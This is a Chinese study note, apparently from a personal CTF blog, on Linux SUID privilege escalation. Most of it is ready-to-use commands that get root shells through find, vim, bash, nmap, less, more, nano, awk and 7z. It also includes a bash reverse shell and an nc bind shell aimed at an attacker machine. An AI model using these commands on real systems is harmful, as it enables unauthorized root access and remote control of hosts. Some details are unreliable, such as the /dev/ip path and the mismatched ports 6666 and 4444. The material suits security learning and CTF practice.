---
title: suid提权
date: 2025-09-23 17:14:15
tags:
- suid提权
category:
- 学习笔记
---

参考链接：

https://www.cnblogs.com/gsh23/p/18109524

https://blog.csdn.net/2401_84466336/article/details/139265954

# suid提权

SUID是Linux中的一中特殊权限，SUID可以让二进制程序的调用者以文件拥有者的身份运行该文件。如果对于一些特殊命令设置了SUID，那么就会有被提权的风险。而这个SUID提权的关键就是，找到root用户所拥有的SUID的文件&命令，运行该文件或者调用命令时，暂时拥有root权限，以root身份来执行。

---

## 设置SUID

如何设置SUID

```
chmod u+s filename   设置SUID位
chmod u-s filename   去掉SUID设置
```

例如：

先查看文件权限

```
ls -al
```

再输入

```perl
chmod u+s find
```

然后再次查看

发现文件的权限描述符由`-rwxr-xr-x`变为`-rwsr-xr-x`

代表文件已经获得了suid权限。

---

## 通过root设置的具有SUID权限的二进制可执行文件提权

https://gtfobins.github.io/
我们可以通过这个网站来搜寻对应命令文件的SUID提权使用方法

已知的具有SUID权限的二进制可执行文件大概有这些

```
nmap
vim
find
bash
more
less
nano
cp
awk
```

---

## 查找具有SUID权限文件的命令

```
    find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -print 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} ;
```

---

## 可执行文件提权

### find

find比较常用,find用来在系统中查找文件。同时，它也有执行命令的能力。 因此，如果配置为使用SUID权限运行，则可以通过find执行的命令都将以root身份去运行。

#### 利用find命令执行

```
touch anyfile #必须要有这个文件
find anyfile -exec whoami \;

# root
```

然后即可再-exec后填写任意要执行的命令，常用/etc/passwd，因为该文件基本都存在

```
find /etc/passwd -exec /readflag \;

# flag{123}
```

#### 利用find进入shell

```
find anyfile -exec '/bin/sh' \;
sh-5.0# whoami
root
```

#### 利用find来反弹shell

首先在攻击机上

```
nc -lvvp 6666
```

反弹shell

```
find anyfile -exec bash -c 'bash -i >& /dev/ip/6666 0>&1' \;
```

#### 利用find来广播shell

广播shell

```
find user -exec nc -lvp 6666 -e '/bin/sh' \;
```

在攻击机上:

```
nc 靶机ip 4444
```

---

### Vim

vim的主要用途是做编辑器,是，如果以SUID运行，它将继承root用户的权限，因此可以读取系统上的所有文件。

```
vim.tiny  /etc/passwd
```

#### 通过vim进入shell

```
vim.tiny
#vim命令
:set shell = '/bin/sh'
:shell
```

---

### Bash

#### 利用bash以root身份打开一个bash shell

```
bash -p
bash-3.2# id
uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)
```

---

### nmap

在早期nmap版本中,带有交互模式,因而允许用户执行shell命令

#### 使用如下命令进入nmap交互模式:

```
nmap --interactive
```

#### 在nmap交互模式中 通过如下命令提权

```
nmap> !sh
sh-3.2# whoami
root
```

---

### less

#### 利用less命令进入shell

```
less /etc/passwd
#在less中输入:
!/bin/sh
```

---

### more

#### 利用more命令进入shell

```
more /etc/passwd
#在more中输入:
!/bin/sh
```

---

### nano

#### nano进入shell的方法为

```
nano #进入nano编辑器
Ctrl + R
Ctrl + X 
#即可输入命令
```

---

### awk

#### awk命令进入shell

```
awk 'BEGIN {system("/bin/bash")}'
```

---

### 7z

#### 利用7z以root权限读取文件

```
/usr/bin/7z a -ttar -an -so /flag
```









